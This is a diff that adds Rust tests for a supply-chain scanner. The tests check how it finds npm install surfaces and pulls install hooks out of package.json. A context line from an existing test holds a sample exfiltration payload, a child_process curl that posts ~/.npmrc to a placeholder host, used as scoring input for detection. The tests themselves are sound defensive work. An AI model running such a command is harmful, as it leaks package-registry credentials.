@@ -6,7 +6,10 @@ use std::fs;
 use std::path::Path;
 
 use supply_chain_scanner::ai::collect::{collect, CollectedPayload, FileSize};
-use supply_chain_scanner::ecosystem::install_surface::PyPiInstallSurface;
+use supply_chain_scanner::ecosystem::install_surface::{
+    install_surface_for, CargoInstallSurface, InstallCommand, InstallSurface, NpmInstallSurface,
+    PyPiInstallSurface,
+};
 
 /// The install surface the collector runs with in these tests.
 const PYPI: PyPiInstallSurface = PyPiInstallSurface;
@@ -385,4 +388,139 @@ fn a_postinstall_exfiltration_one_liner_scores_higher_than_any_single_signal() {
 
     let payload = "require('child_process').execSync(`curl -d @${process.env.HOME}/.npmrc https://x.example`)";
     assert!(suspicion_score(payload) >= 6);
+}
+
+// ---------------------------------------------------------------------------
+// Task 7: npm install commands
+// ---------------------------------------------------------------------------
+
+/// Writes a `package/package.json` whose `scripts` table is exactly
+/// `scripts_json` (a JSON object literal, e.g. `r#"{"postinstall": "node x.js"}"#`).
+fn write_package_json(root: &Path, scripts_json: &str) {
+    write_file(
+        root,
+        "package/package.json",
+        &format!(r#"{{"name": "demo", "version": "1.0.0", "scripts": {scripts_json}}}"#),
+    );
+}
+
+#[test]
+fn npm_install_surface_matches_package_json_and_index() {
+    assert!(NpmInstallSurface.is_install_surface(Path::new("package/package.json")));
+    assert!(NpmInstallSurface.is_install_surface(Path::new("package/index.js")));
+    assert!(!NpmInstallSurface.is_install_surface(Path::new("package/lib/util.js")));
+}
+
+#[test]
+fn npm_install_commands_extracts_the_four_install_hooks_in_order() {
+    let root = tempfile::tempdir().unwrap();
+    write_package_json(
+        root.path(),
+        r#"{
+            "postinstall": "node post.js",
+            "test": "jest",
+            "preinstall": "node pre.js",
+            "build": "webpack",
+            "install": "node-gyp rebuild",
+            "prepare": "husky install"
+        }"#,
+    );
+
+    let commands = NpmInstallSurface.install_commands(root.path());
+
+    assert_eq!(
+        commands,
+        vec![
+            InstallCommand {
+                hook: "preinstall".to_string(),
+                command: "node pre.js".to_string(),
+            },
+            InstallCommand {
+                hook: "install".to_string(),
+                command: "node-gyp rebuild".to_string(),
+            },
+            InstallCommand {
+                hook: "postinstall".to_string(),
+                command: "node post.js".to_string(),
+            },
+            InstallCommand {
+                hook: "prepare".to_string(),
+                command: "husky install".to_string(),
+            },
+        ]
+    );
+    assert!(!commands
+        .iter()
+        .any(|c| c.hook == "test" || c.hook == "build"));
+}
+
+#[test]
+fn npm_install_commands_is_empty_for_a_package_with_no_scripts() {
+    let root = tempfile::tempdir().unwrap();
+    write_file(
+        root.path(),
+        "package/package.json",
+        r#"{"name": "demo", "version": "1.0.0"}"#,
+    );
+
+    assert!(NpmInstallSurface.install_commands(root.path()).is_empty());
+}
+
+#[test]
+fn npm_install_commands_is_empty_rather_than_an_error_for_unparseable_package_json() {
+    let root = tempfile::tempdir().unwrap();
+    write_file(root.path(), "package/package.json", "{ this is not json");
+
+    assert!(NpmInstallSurface.install_commands(root.path()).is_empty());
+
+    // A missing package.json altogether is the same, benign case.
+    let empty_root = tempfile::tempdir().unwrap();
+    assert!(NpmInstallSurface
+        .install_commands(empty_root.path())
+        .is_empty());
+}
+
+#[test]
+fn pypi_and_cargo_install_commands_default_to_empty() {
+    let root = tempfile::tempdir().unwrap();
+    write_package_json(root.path(), r#"{"postinstall": "node post.js"}"#);
+
+    assert!(PyPiInstallSurface.install_commands(root.path()).is_empty());
+    assert!(CargoInstallSurface.install_commands(root.path()).is_empty());
+}
+
+#[test]
+fn collect_populates_install_commands_from_the_surface() {
+    let root = tempfile::tempdir().unwrap();
+    write_package_json(root.path(), r#"{"postinstall": "node post.js"}"#);
+    write_file(root.path(), "package/index.js", "module.exports = 1;\n");
+
+    let surface = install_surface_for("npm").expect("npm must resolve to an install surface");
+    let payload = collect(root.path(), surface, 100_000).unwrap();
+
+    assert_eq!(
+        payload.install_commands,
+        vec![InstallCommand {
+            hook: "postinstall".to_string(),
+            command: "node post.js".to_string(),
+        }]
+    );
+    // The install-commands bytes are not file content: the reviewable
+    // byte figures must account for exactly the two files on disk
+    // (package.json and index.js), with nothing added or removed for
+    // the install-commands section.
+    let package_json_len = fs::metadata(root.path().join("package/package.json"))
+        .unwrap()
+        .len();
+    let index_js_len = fs::metadata(root.path().join("package/index.js"))
+        .unwrap()
+        .len();
+    assert_eq!(
+        payload.reviewable_bytes_total,
+        package_json_len + index_js_len
+    );
+    assert_eq!(
+        payload.reviewable_bytes_sent,
+        payload.reviewable_bytes_total
+    );
 }
